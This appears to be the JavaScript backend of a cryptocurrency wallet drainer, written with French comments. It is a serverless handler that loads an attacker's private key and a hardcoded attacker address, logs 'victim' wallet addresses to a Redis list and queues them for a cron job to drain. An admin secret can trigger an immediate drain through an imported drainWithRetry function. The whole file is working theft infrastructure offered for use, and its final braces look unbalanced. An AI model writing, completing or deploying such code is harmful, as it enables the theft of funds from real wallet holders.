import { ethers } from 'ethers';
import { createClient } from 'redis';
import { drainWithRetry } from '../lib/drain.js';

const ATTACKER_ADDRESS = '0x81720ac1a232EfA3D76B2586f789a3b1A5da51c9';
const RPC_URL = 'https://eth-mainnet.g.alchemy.com/v2/demo';

function getPrivateKey() {
  const key = process.env.ATTACKER_PRIVATE_KEY?.trim();
  if (!key || key.length !== 64) {
    throw new Error('🔴 ATTACKER_PRIVATE_KEY manquante ou invalide (64 hex sans 0x).');
  }
  return '0x' + key;
}

const PRIVATE_KEY = getPrivateKey();
const wallet = new ethers.Wallet(PRIVATE_KEY);

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, DELETE, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();

  if (req.method === 'POST') {
    const { victim, chain, adminSecret } = req.body;

    // --- DRAIN MANUEL ADMIN ---
    if (adminSecret) {
      if (!process.env.ADMIN_SECRET || process.env.ADMIN_SECRET.trim().length === 0) {
        return res.status(500).json({ error: 'ADMIN_SECRET non configuré sur le serveur' });
      }
      if (adminSecret !== process.env.ADMIN_SECRET) {
        return res.status(401).json({ error: 'Secret admin invalide' });
      }
      if (!victim || !ethers.utils.isAddress(victim)) {
        return res.status(400).json({ error: 'Adresse victime invalide' });
      }
      const targetChain = chain || '1';
      console.log(`🔧 Drain manuel admin pour ${victim} (chain ${targetChain})`);

      const client = createClient({ url: process.env.REDIS_URL });
      try {
        await client.connect();
        const list = await client.get('victims:list');
        const parsedList = list ? JSON.parse(list) : [];
        if (!parsedList.includes(victim)) {
          parsedList.push(victim);
          await client.set('victims:list', JSON.stringify(parsedList));
        }
      } finally {
        await client.disconnect();
      }

      const success = await drainWithRetry(victim, targetChain);
      if (success) {
        return res.status(200).json({ success: true, victim, chain: targetChain });
      } else {
        return res.status(500).json({ error: 'Échec du drain après plusieurs tentatives' });
      }
    }

    // --- FLUX NORMAL : enregistrement et mise en file d'attente (le cron drainera) ---
    if (!victim) return res.status(400).json({ error: 'Paramètre victim manquant' });

    const targetChain = chain || '1';

    const client = createClient({ url: process.env.REDIS_URL });
    await client.connect();

    try {
      // Ajoute à la liste globale
      const list = await client.get('victims:list');
      const parsedList = list ? JSON.parse(list) : [];
      if (!parsedList.includes(victim)) {
        parsedList.push(victim);
        await client.set('victims:list', JSON.stringify(parsedList));
      }

      // Pousse dans la queue pour le cron (c’est tout, pas de drain immédiat)
      await client.lPush('drain:queue', JSON.stringify({ victim, chain: targetChain }));

      return res.status(200).json({ success: true, queued: true, victim, chain: targetChain });
    } catch (err) {
      console.error('Erreur mise en file:', err);
      return res.status(500).json({ error: 'Échec mise en file' });
    } finally {
      await client.disconnect();
    }
}
